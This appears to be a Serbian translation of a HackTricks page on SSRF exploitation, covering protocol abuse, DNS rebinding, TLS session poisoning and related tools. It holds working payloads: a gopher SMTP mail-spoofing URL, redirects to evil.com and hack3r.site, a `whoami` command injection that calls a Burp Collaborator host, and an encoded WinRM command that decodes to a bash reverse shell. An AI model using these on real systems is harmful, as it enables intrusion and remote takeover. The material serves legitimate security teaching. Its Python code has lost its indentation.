# SSRF (Server Side Request Forgery)

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Koristite [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) da biste lako izgradili i **automatizovali radne tokove** pokretane najnaprednijim alatima zajednice.\
Dobijte pristup danas:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite **oglašavanje vaše kompanije u HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>


## Osnovne informacije

Ranjivost **Server-side Request Forgery (SSRF)** se javlja kada napadač manipuliše **server-side aplikacijom** da izvrši **HTTP zahteve** ka domenu po izboru napadača. Ova ranjivost izlaže server proizvoljnim spoljnim zahtevima koje usmerava napadač.

## Snimanje SSRF

Prva stvar koju trebate uraditi je da snimite SSRF interakciju koju generišete. Za snimanje HTTP ili DNS interakcije možete koristiti alate kao što su:

* **Burp Collaborator**
* [**pingb**](http://pingb.in)
* [**canarytokens**](https://canarytokens.org/generate)
* [**interractsh**](https://github.com/projectdiscovery/interactsh)
* [**http://webhook.site**](http://webhook.site)
* [**https://github.com/teknogeek/ssrf-sheriff**](https://github.com/teknogeek/ssrf-sheriff)
* [http://requestrepo.com/](http://requestrepo.com/)
* [https://github.com/stolenusername/cowitness](https://github.com/stolenusername/cowitness)
* [https://github.com/dwisiswant0/ngocok](https://github.com/dwisiswant0/ngocok) - Burp Collaborator koji koristi ngrok

## Bypass belih domena

Obično ćete primetiti da SSRF radi samo na **određenim belim domenima** ili URL-ovima. Na sledećoj stranici imate **kompilaciju tehnika za pokušaj zaobilaženja te bele liste**:

{% content-ref url="url-format-bypass.md" %}
[url-format-bypass.md](url-format-bypass.md)
{% endcontent-ref %}

### Bypass putem otvorenog preusmeravanja

Ako je server pravilno zaštićen, možete **zaobići sve restrikcije iskorišćavanjem otvorenog preusmeravanja unutar web stranice**. Zato što će web stranica dozvoliti **SSRF ka istom domenu** i verovatno će **pratiti preusmeravanja**, možete iskoristiti **otvoreno preusmeravanje da naterate server da pristupi internim resursima**.\
Pročitajte više ovde: [https://portswigger.net/web-security/ssrf](https://portswigger.net/web-security/ssrf)

## Protokoli

- **file://**
- URL šema `file://` se koristi za referenciranje direktne putanje do `/etc/passwd`: `file:///etc/passwd`

- **dict://**
- DICT URL šema se koristi za pristupanje definicijama ili listama reči putem DICT protokola. Primer ilustruje konstruisani URL koji cilja određenu reč, bazu podataka i broj unosa, kao i primer PHP skripta koja potencijalno zloupotrebljava DICT server koristeći napadačem pružene akreditive: `dict://<generic_user>;<auth>@<generic_host>:<port>/d:<word>:<database>:<n>`

- **SFTP://**
- Identifikovan kao protokol za siguran prenos fajlova preko sigurne ljuske, primer prikazuje kako se PHP skript može iskoristiti za povezivanje sa zlonamernim SFTP serverom: `url=sftp://generic.com:11111/`

- **TFTP://**
- Trivial File Transfer Protocol, koji radi preko UDP-a, je pomenut sa primerom PHP skripta koji je dizajniran da pošalje zahtev TFTP serveru. TFTP zahtev se šalje na 'generic.com' na portu '12346' za fajl 'TESTUDPPACKET': `ssrf.php?url=tftp://generic.com:12346/TESTUDPPACKET`

- **LDAP://**
- Ovaj segment pokriva Lightweight Directory Access Protocol, naglašavajući njegovu upotrebu za upravljanje i pristupanje distribuiranim informacionim servisima direktorijuma preko IP mreža. Interakcija sa LDAP serverom na localhostu: `'%0astats%0aquit' via ssrf.php?url=ldap://localhost:11211/%0astats%0aquit.`

- **SMTP**
- Opisana je metoda za iskorišćavanje SSRF ranjivosti za interakciju sa SMTP servisima na localhostu, uključujući korake za otkrivanje internih domenskih imena i dalje istraživačke akcije na osnovu tih informacija.
```
From https://twitter.com/har1sec/status/1182255952055164929
1. connect with SSRF on smtp localhost:25
2. from the first line get the internal domain name 220[ http://blabla.internaldomain.com ](https://t.co/Ad49NBb7xy)ESMTP Sendmail
3. search[ http://internaldomain.com ](https://t.co/K0mHR0SPVH)on github, find subdomains
4. connect
```
- **Curl URL globbing - Bypassiranje WAF-a**
- Ako se SSRF izvršava pomoću **curl**-a, curl ima funkcionalnost nazvanu [**URL globbing**](https://everything.curl.dev/cmdline/globbing) koja može biti korisna za zaobilaženje WAF-ova. Na primjer, u ovom [**članku**](https://blog.arkark.dev/2022/11/18/seccon-en/#web-easylfi) možete pronaći primjer za **putnu infiltraciju putem `file` protokola**:
```
file:///app/public/{.}./{.}./{app/public/hello.html,flag.txt}
```
- **Gopher://**
- Razmatra se mogućnost Gopher protokola da specificira IP adresu, port i bajtove za komunikaciju sa serverom, zajedno sa alatima poput Gopherus-a i remote-method-guesser-a za kreiranje payload-a. Prikazane su dve različite upotrebe:

### Gopher://

Korišćenjem ovog protokola možete specificirati **IP adresu, port i bajtove** koje želite da server **pošalje**. Zatim, možete iskoristiti SSRF da **komunicirate sa bilo kojim TCP serverom** (ali prvo morate znati kako da komunicirate sa servisom).\
Srećom, možete koristiti [Gopherus](https://github.com/tarunkant/Gopherus) za kreiranje payload-a za nekoliko servisa. Takođe, [remote-method-guesser](https://github.com/qtc-de/remote-method-guesser) se može koristiti za kreiranje _gopher_ payload-a za _Java RMI_ servise.

**Gopher smtp**
```
ssrf.php?url=gopher://127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cvictime@site.com%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a
will make a request like
HELO localhost
MAIL FROM:<hacker@site.com>
RCPT TO:<victim@site.com>
DATA
From: [Hacker] <hacker@site.com>
To: <victime@site.com>
Date: Tue, 15 Sep 2017 17:20:26 -0400
Subject: Ah Ah AHYou didn't say the magic word !
.
QUIT
```
**Gopher HTTP**

Gopher HTTP je tehnika koja se koristi za izvršavanje Server-Side Request Forgery (SSRF) napada putem Gopher protokola. Gopher je stari protokol za prenos podataka koji se koristio pre HTTP-a. 

SSRF napad se obično izvodi tako što se aplikacija navede da izvrši HTTP zahtev na unapred određeni URL. Međutim, umesto da se koristi HTTP protokol, koristi se Gopher protokol. 

Gopher HTTP koristi URL shemu `gopher://` umesto `http://` i omogućava napadaču da izvrši različite akcije, kao što su čitanje lokalnih datoteka, izvršavanje komandi na serveru ili čak napad na interne resurse mreže. 

Da bi se izvršio Gopher HTTP napad, napadač mora da pronađe ranjivu tačku u aplikaciji koja omogućava izvršavanje Gopher HTTP zahteva. Ova tehnika može biti veoma opasna, jer omogućava napadaču da zaobiđe sigurnosne mehanizme i pristupi osetljivim informacijama ili izvrši zlonamerne akcije na serveru. 

Da biste se zaštitili od Gopher HTTP napada, preporučuje se da se redovno ažuriraju i zakrpe sve ranjive tačke u aplikaciji, kao i da se primene sigurnosne smernice za sprečavanje SSRF napada.
```bash
#For new lines you can use %0A, %0D%0A
gopher://<server>:8080/_GET / HTTP/1.0%0A%0A
gopher://<server>:8080/_POST%20/x%20HTTP/1.0%0ACookie: eatme%0A%0AI+am+a+post+body
```
**Gopher SMTP - Povratno povezivanje na 1337**

{% code title="redirect.php" %}
```php
<?php
header("Location: gopher://hack3r.site:1337/_SSRF%0ATest!");
?>Now query it.
https://example.com/?q=http://evil.com/redirect.php.
```
{% endcode %}


## SSRF putem zaglavlja Referrer i drugih

Analitički softver na serverima često beleži zaglavlje Referrer kako bi pratili dolazne linkove, praksa koja nenamerno izlaže aplikacije ranjivostima Server-Side Request Forgery (SSRF). To je zato što takav softver može posetiti spoljne URL-ove navedene u zaglavlju Referrer kako bi analizirao sadržaj referentnog sajta. Da biste otkrili ove ranjivosti, preporučuje se korišćenje Burp Suite dodatka "**Collaborator Everywhere**", koji koristi način na koji alati za analitiku obrađuju zaglavlje Referer kako bi identifikovali potencijalne površine napada SSRF.

## SSRF putem SNI podataka iz sertifikata

Prikazana je konfiguracija Nginx-a koja omogućava povezivanje sa bilo kojim backend-om putem jednostavnog podešavanja.
```
stream {
server {
listen 443;
resolver 127.0.0.11;
proxy_pass $ssl_preread_server_name:443;
ssl_preread on;
}
}
```
U ovoj konfiguraciji, vrednost iz polja Server Name Indication (SNI) se direktno koristi kao adresa backend-a. Ova postavka izlaže ranjivost Server-Side Request Forgery (SSRF), koja se može iskoristiti jednostavnim navođenjem željene IP adrese ili imena domena u polju SNI. Primer iskorišćavanja za prisiljavanje konekcije ka proizvoljnom backend-u, kao što je `internal.host.com`, koristeći `openssl` komandu je prikazan ispod:
```bash
openssl s_client -connect target.com:443 -servername "internal.host.com" -crlf
```
## [Wget slanje datoteka](../file-upload/#wget-file-upload-ssrf-trick)

## SSRF sa ubacivanjem komandi

Vredelo bi pokušati sa payloadom kao što je: `` url=http://3iufty2q67fuy2dew3yug4f34.burpcollaborator.net?`whoami` ``

## Prikazivanje PDF-ova

Ako veb stranica automatski kreira PDF sa nekim informacijama koje ste pružili, možete **ubaciti neki JS koji će biti izvršen od strane samog kreatora PDF-a** (servera) prilikom kreiranja PDF-a i moći ćete zloupotrebiti SSRF. [**Pronađite više informacija ovde**](../xss-cross-site-scripting/server-side-xss-dynamic-pdf.md)**.**

## Od SSRF do DoS

Kreirajte nekoliko sesija i pokušajte da preuzmete teške datoteke iskorišćavajući SSRF iz sesija.

## SSRF PHP funkcije

{% content-ref url="../../network-services-pentesting/pentesting-web/php-tricks-esp/php-ssrf.md" %}
[php-ssrf.md](../../network-services-pentesting/pentesting-web/php-tricks-esp/php-ssrf.md)
{% endcontent-ref %}

## SSRF Preusmeravanje na Gopher

Za neke eksploatacije možda će vam biti potrebno **poslati preusmeravajući odgovor** (potencijalno koristeći drugi protokol poput gopher-a). Ovde imate različite Python kodove za odgovor sa preusmeravanjem:
```python
# First run: openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes
from http.server import HTTPServer, BaseHTTPRequestHandler
import ssl

class MainHandler(BaseHTTPRequestHandler):
def do_GET(self):
print("GET")
self.send_response(301)

self.send_header("Location", "gopher://127.0.0.1:5985/_%50%4f%53%54%20%2f%77%73%6d%61%6e%20%48%54%54%50%2f%31%2e%31%0d%0a%48%6f%73%74%3a%20%31%30%2e%31%30%2e%31%31%2e%31%31%37%3a%35%39%38%36%0d%0a%55%73%65%72%2d%41%67%65%6e%74%3a%20%70%79%74%68%6f%6e%2d%72%65%71%75%65%73%74%73%2f%32%2e%32%35%2e%31%0d%0a%41%63%63%65%70%74%2d%45%6e%63%6f%64%69%6e%67%3a%20%67%7a%69%70%2c%20%64%65%66%6c%61%74%65%0d%0a%41%63%63%65%70%74%3a%20%2a%2f%2a%0d%0a%43%6f%6e%6e%65%63%74%69%6f%6e%3a%20%63%6c%6f%73%65%0d%0a%43%6f%6e%74%65%6e%74%2d%54%79%70%65%3a%20%61%70%70%6c%69%63%61%74%69%6f%6e%2f%73%6f%61%70%2b%78%6d%6c%3b%63%68%61%72%73%65%74%3d%55%54%46%2d%38%0d%0a%43%6f%6e%74%65%6e%74%2d%4c%65%6e%67%74%68%3a%20%31%37%32%38%0d%0a%0d%0a%3c%73%3a%45%6e%76%65%6c%6f%70%65%20%78%6d%6c%6e%73%3a%73%3d%22%68%74%74%70%3a%2f%2f%77%77%77%2e%77%33%2e%6f%72%67%2f%32%30%30%33%2f%30%35%2f%73%6f%61%70%2d%65%6e%76%65%6c%6f%70%65%22%20%78%6d%6c%6e%73%3a%61%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%78%6d%6c%73%6f%61%70%2e%6f%72%67%2f%77%73%2f%32%30%30%34%2f%30%38%2f%61%64%64%72%65%73%73%69%6e%67%22%20%78%6d%6c%6e%73%3a%68%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%6d%69%63%72%6f%73%6f%66%74%2e%63%6f%6d%2f%77%62%65%6d%2f%77%73%6d%61%6e%2f%31%2f%77%69%6e%64%6f%77%73%2f%73%68%65%6c%6c%22%20%78%6d%6c%6e%73%3a%6e%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%78%6d%6c%73%6f%61%70%2e%6f%72%67%2f%77%73%2f%32%30%30%34%2f%30%39%2f%65%6e%75%6d%65%72%61%74%69%6f%6e%22%20%78%6d%6c%6e%73%3a%70%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%6d%69%63%72%6f%73%6f%66%74%2e%63%6f%6d%2f%77%62%65%6d%2f%77%73%6d%61%6e%2f%31%2f%77%73%6d%61%6e%2e%78%73%64%22%20%78%6d%6c%6e%73%3a%77%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%64%6d%74%66%2e%6f%72%67%2f%77%62%65%6d%2f%77%73%6d%61%6e%2f%31%2f%77%73%6d%61%6e%2e%78%73%64%22%20%78%6d%6c%6e%73%3a%78%73%69%3d%22%68%74%74%70%3a%2f%2f%77%77%77%2e%77%33%2e%6f%72%67%2f%32%30%30%31%2f%58%4d%4c%53%63%68%65%6d%61%22%3e%0a%20%20%20%3c%73%3a%48%65%61%64%65%72%3e%0a%20%20%20%20%20%20%3c%61%3a%54%6f%3e%48%54%54%50%3a%2f%2f%31%39%32%2e%31%36%38%2e%31%2e%31%3a%35%39%38%36%2f%77%73%6d%61%6e%2f%3c%2f%61%3a%54%6f%3e%0a%20%20%20%20%20%20%3c%77%3a%52%65%73%6f%75%72%63%65%55%52%49%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%74%72%75%65%22%3e%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%64%6d%74%66%2e%6f%72%67%2f%77%62%65%6d%2f%77%73%63%69%6d%2f%31%2f%63%69%6d%2d%73%63%68%65%6d%61%2f%32%2f%53%43%58%5f%4f%70%65%72%61%74%69%6e%67%53%79%73%74%65%6d%3c%2f%77%3a%52%65%73%6f%75%72%63%65%55%52%49%3e%0a%20%20%20%20%20%20%3c%61%3a%52%65%70%6c%79%54%6f%3e%0a%20%20%20%20%20%20%20%20%20%3c%61%3a%41%64%64%72%65%73%73%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%74%72%75%65%22%3e%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%78%6d%6c%73%6f%61%70%2e%6f%72%67%2f%77%73%2f%32%30%30%34%2f%30%38%2f%61%64%64%72%65%73%73%69%6e%67%2f%72%6f%6c%65%2f%61%6e%6f%6e%79%6d%6f%75%73%3c%2f%61%3a%41%64%64%72%65%73%73%3e%0a%20%20%20%20%20%20%3c%2f%61%3a%52%65%70%6c%79%54%6f%3e%0a%20%20%20%20%20%20%3c%61%3a%41%63%74%69%6f%6e%3e%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%64%6d%74%66%2e%6f%72%67%2f%77%62%65%6d%2f%77%73%63%69%6d%2f%31%2f%63%69%6d%2d%73%63%68%65%6d%61%2f%32%2f%53%43%58%5f%4f%70%65%72%61%74%69%6e%67%53%79%73%74%65%6d%2f%45%78%65%63%75%74%65%53%68%65%6c%6c%43%6f%6d%6d%61%6e%64%3c%2f%61%3a%41%63%74%69%6f%6e%3e%0a%20%20%20%20%20%20%3c%77%3a%4d%61%78%45%6e%76%65%6c%6f%70%65%53%69%7a%65%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%74%72%75%65%22%3e%31%30%32%34%30%30%3c%2f%77%3a%4d%61%78%45%6e%76%65%6c%6f%70%65%53%69%7a%65%3e%0a%20%20%20%20%20%20%3c%61%3a%4d%65%73%73%61%67%65%49%44%3e%75%75%69%64%3a%30%41%42%35%38%30%38%37%2d%43%32%43%33%2d%30%30%30%35%2d%30%30%30%30%2d%30%30%30%30%30%30%30%31%30%30%30%30%3c%2f%61%3a%4d%65%73%73%61%67%65%49%44%3e%0a%20%20%20%20%20%20%3c%77%3a%4f%70%65%72%61%74%69%6f%6e%54%69%6d%65%6f%75%74%3e%50%54%31%4d%33%30%53%3c%2f%77%3a%4f%70%65%72%61%74%69%6f%6e%54%69%6d%65%6f%75%74%3e%0a%20%20%20%20%20%20%3c%77%3a%4c%6f%63%61%6c%65%20%78%6d%6c%3a%6c%61%6e%67%3d%22%65%6e%2d%75%73%22%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%66%61%6c%73%65%22%20%2f%3e%0a%20%20%20%20%20%20%3c%70%3a%44%61%74%61%4c%6f%63%61%6c%65%20%78%6d%6c%3a%6c%61%6e%67%3d%22%65%6e%2d%75%73%22%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%66%61%6c%73%65%22%20%2f%3e%0a%20%20%20%20%20%20%3c%77%3a%4f%70%74%69%6f%6e%53%65%74%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%74%72%75%65%22%20%2f%3e%0a%20%20%20%20%20%20%3c%77%3a%53%65%6c%65%63%74%6f%72%53%65%74%3e%0a%20%20%20%20%20%20%20%20%20%3c%77%3a%53%65%6c%65%63%74%6f%72%20%4e%61%6d%65%3d%22%5f%5f%63%69%6d%6e%61%6d%65%73%70%61%63%65%22%3e%72%6f%6f%74%2f%73%63%78%3c%2f%77%3a%53%65%6c%65%63%74%6f%72%3e%0a%20%20%20%20%20%20%3c%2f%77%3a%53%65%6c%65%63%74%6f%72%53%65%74%3e%0a%20%20%20%3c%2f%73%3a%48%65%61%64%65%72%3e%0a%20%20%20%3c%73%3a%42%6f%64%79%3e%0a%20%20%20%20%20%20%3c%70%3a%45%78%65%63%75%74%65%53%68%65%6c%6c%43%6f%6d%6d%61%6e%64%5f%49%4e%50%55%54%20%78%6d%6c%6e%73%3a%70%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%64%6d%74%66%2e%6f%72%67%2f%77%62%65%6d%2f%77%73%63%69%6d%2f%31%2f%63%69%6d%2d%73%63%68%65%6d%61%2f%32%2f%53%43%58%5f%4f%70%65%72%61%74%69%6e%67%53%79%73%74%65%6d%22%3e%0a%20%20%20%20%20%20%20%20%20%3c%70%3a%63%6f%6d%6d%61%6e%64%3e%65%63%68%6f%20%2d%6e%20%59%6d%46%7a%61%43%41%74%61%53%41%2b%4a%69%41%76%5a%47%56%32%4c%33%52%6a%63%43%38%78%4d%43%34%78%4d%43%34%78%4e%43%34%78%4d%53%38%35%4d%44%41%78%49%44%41%2b%4a%6a%45%3d%20%7c%20%62%61%73%65%36%34%20%2d%64%20%7c%20%62%61%73%68%3c%2f%70%3a%63%6f%6d%6d%61%6e%64%3e%0a%20%20%20%20%20%20%20%20%20%3c%70%3a%74%69%6d%65%6f%75%74%3e%30%3c%2f%70%3a%74%69%6d%65%6f%75%74%3e%0a%20%20%20%20%20%20%3c%2f%70%3a%45%78%65%63%75%74%65%53%68%65%6c%6c%43%6f%6d%6d%61%6e%64%5f%49%4e%50%55%54%3e%0a%20%20%20%3c%2f%73%3a%42%6f%64%79%3e%0a%3c%2f%73%3a%45%6e%76%65%6c%6f%70%65%3e%0a")
```python
self.end_headers()

httpd = HTTPServer(('0.0.0.0', 443), MainHandler)
httpd.socket = ssl.wrap_socket(httpd.socket, certfile="server.pem", server_side=True)
httpd.serve_forever()
```

```python
from flask import Flask, redirect
from urllib.parse import quote
app = Flask(__name__)

@app.route('/')
def root():
return redirect('gopher://127.0.0.1:5985/_%50%4f%53%54%20%2f%77%73%6d%61%6e%20%48%54%54%50%2f%31%2e%31%0d%0a%48%6f%73%74%3a%20', code=301)

if __name__ == "__main__":
app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
```
<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Koristite [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) da biste lako izgradili i **automatizovali tokove rada** pokretane najnaprednijim alatima zajednice na svetu.\
Dobijte pristup danas:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Bajpasiranje CORS/SOP-a putem DNS preusmeravanja

Ako imate **problema** sa **izvlačenjem sadržaja sa lokalne IP adrese** zbog **CORS/SOP-a**, može se koristiti **DNS preusmeravanje** da bi se zaobišlo to ograničenje:

{% content-ref url="../cors-bypass.md" %}
[cors-bypass.md](../cors-bypass.md)
{% endcontent-ref %}

### Automatizovano DNS preusmeravanje

[**`Singularity of Origin`**](https://github.com/nccgroup/singularity) je alat za izvođenje napada [DNS preusmeravanjem](https://en.wikipedia.org/wiki/DNS\_rebinding). Uključuje neophodne komponente za preusmeravanje IP adrese DNS imena servera napada na IP adresu ciljne mašine i za slanje napadačkih payloada za iskorišćavanje ranjivog softvera na ciljnoj mašini.

Pogledajte i **javno pokrenuti server na** [**http://rebind.it/singularity.html**](http://rebind.it/singularity.html)

## DNS preusmeravanje + TLS ID sesije/ID tiketa sesije

Zahtevi:

* **SSRF**
* **Izlazne TLS sesije**
* **Stvari na lokalnim portovima**

Napad:

1. Zamolite korisnika/bota da **pristupi** domenu koji kontroliše **napadač**
2. **TTL** DNS-a je **0** sekundi (tako da će žrtva uskoro ponovo proveriti IP domena)
3. Između žrtve i domena napadača se uspostavlja **TLS veza**. Napadač unosi **payload unutar** **ID sesije ili tiketa sesije**.
4. **Domena** će pokrenuti **beskonačnu petlju** preusmeravanja na **samu sebe**. Cilj ovoga je da natera korisnika/bota da pristupi domenu sve dok ponovo ne izvrši **DNS zahtev** za taj domen.
5. U DNS zahtevu se sada daje **privatna IP** adresa (na primer, 127.0.0.1)
6. Korisnik/bot će pokušati **ponovo uspostaviti TLS vezu** i da bi to učinio, poslaće **ID sesije/tiket ID sesije** (gde je bio smešten **payload** napadača). Dakle, čestitam, uspeli ste da zamolite **korisnika/bota da napadne samog sebe**.

Imajte na umu da tokom ovog napada, ako želite da napadnete localhost:11211 (_memcache_), morate naterati žrtvu da uspostavi početnu vezu sa www.attacker.com:11211 (**port mora uvek biti isti**).\
Da biste **izvršili ovaj napad, možete koristiti alat**: [https://github.com/jmdx/TLS-poison/](https://github.com/jmdx/TLS-poison/)\
Za **više informacija**, pogledajte predavanje u kojem je objašnjen ovaj napad: [https://www.youtube.com/watch?v=qGpAJxfADjo\&ab\_channel=DEFCONConference](https://www.youtube.com/watch?v=qGpAJxfADjo\&ab\_channel=DEFCONConference)

## Slepa SSRF

Razlika između slepe SSRF i one koja nije slepa je u tome što kod slepe SSRF ne možete videti odgovor na zahtev SSRF. Zato je teže iskoristiti jer ćete moći iskoristiti samo dobro poznate ranjivosti.

### SSRF zasnovan na vremenu

**Proverom vremena** odgovora sa servera može biti **moguće utvrditi da li resurs postoji ili ne** (možda je potrebno više vremena za pristupanje postojećem resursu nego za pristupanje onom koji ne postoji)

## Eksploatacija SSRF-a u oblaku

Ako pronađete ranjivost SSRF-a na mašini koja se izvršava u okruženju oblaka, možete dobiti zanimljive informacije o okruženju oblaka čak i pristupne podatke:

{% content-ref url="cloud-ssrf.md" %}
[cloud-ssrf.md](cloud-ssrf.md)
{% endcontent-ref %}

## Platforme ranjive na SSRF

Nekoliko poznatih platformi sadrži ili je sadržalo ranjivosti SSRF-a, proverite ih na:

{% content-ref url="ssrf-vulnerable-platforms.md" %}
[ssrf-vulnerable-platforms.md](ssrf-vulnerable-platforms.md)
{% endcontent-ref %}

## Alati

### [**SSRFMap**](https://github.com/swisskyrepo/SSRFmap)

Alat za otkrivanje i iskorišćavanje ranjivosti SSRF-a

### [Gopherus](https://github.com/tarunkant/Gopherus)

* [Blog post o Gopherusu](https://spyclub.tech/2018/08/14/2018-08-14-blog-on-gopherus/)

Ovaj alat generiše Gopher payloade za:

* MySQL
* PostgreSQL
* FastCGI
* Redis
* Zabbix
* Memcache

### [remote-method-guesser](https://github.com/qtc-de/remote-method-guesser)

* [Blog post o korišćenju SSRF-a](https://blog.tneitzel.eu/posts/01-attacking-java-rmi-via-ssrf/)

_remote-method-guesser_ je skener ranjivosti _Java RMI_ koji podržava operacije napada za većinu uobičajenih ranjivosti _Java RMI_. Većina dostupnih operacija podržava opciju `--ssrf`, da bi generisala _SSRF_ payload za traženu operaciju. Uz opciju `--gopher`, mogu se direktno generisati spremni _gopher_ payloadi.

### [SSRF Proxy](https://github.com/bcoles/ssrf\_proxy)

SSRF Proxy je višenitni HTTP proxy server dizajniran za tuneliranje saobraćaja klijenta HTTP kroz HTTP servere ranjive na Server-Side Request Forgery (SSRF).

### Za vežbanje

{% embed url="https://github.com/incredibleindishell/SSRF_Vulnerable_Lab" %}

## Reference

* [https://medium.com/@pravinponnusamy/ssrf-payloads-f09b2a86a8b4](https://medium.com/@pravinponnusamy/ssrf-payloads-f09b2a86a8b4)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)
* [https://www.invicti.com/blog/web-security/ssrf-vulnerabilities-caused-by-sni-proxy-misconfigurations/](https://www.invicti.com/blog/web-security/ssrf-vulnerabilities-caused-by-sni-proxy-misconfigurations/)

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks
